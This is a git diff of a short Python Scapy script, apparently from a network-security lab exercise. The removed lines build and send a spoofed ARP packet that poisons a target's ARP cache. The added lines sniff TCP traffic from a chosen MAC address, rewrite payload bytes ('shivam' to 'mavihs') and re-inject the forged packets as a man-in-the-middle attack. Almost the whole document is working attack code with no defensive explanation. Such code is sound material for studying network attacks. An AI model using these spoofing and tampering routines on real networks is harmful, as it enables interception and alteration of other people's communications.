@@ -1,22 +1,24 @@
-# lebron
-
 #!/usr/bin/env python3
 from scapy.all import *
 
-# Define Ethernet frame
-eth_frame = Ether(dst="02:42:0a:09:00:05")
+print("LAUNCHING MITM ATTACK.........")
 
-# Define ARP packet
-arp_request = ARP(
-    op=1,
-    psrc="10.9.0.6",               # Victim B's IP address
-    hwsrc="02:42:0a:09:00:69",     # Attacker's MAC address
-    pdst="10.9.0.5",               # Target A's IP address
-    hwdst="02:42:0a:09:00:05"      # Target A's MAC address
-)
+def spoof_pkt(pkt):
+    newpkt = IP(bytes(pkt[IP]))
+    del(newpkt.chksum)
+    del(newpkt[TCP].payload)
+    del(newpkt[TCP].chksum)
 
-# Combine the Ethernet frame with the ARP packet
-packet = eth_frame / arp_request
+    if pkt[TCP].payload:
+        data = pkt[TCP].payload.load
+        print("*** %s, length: %d" % (data, len(data)))
 
-# Send the packet on a specific network interface
-sendp(packet, iface="br-33d7cd2e3f46")
+        # Replace a pattern
+        newdata = data.replace(b'shivam', b'mavihs')
+
+        send(newpkt/newdata)
+    else:
+        send(newpkt)
+
+f = 'tcp and ether src 02:42:0a:69:00:05'
+pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
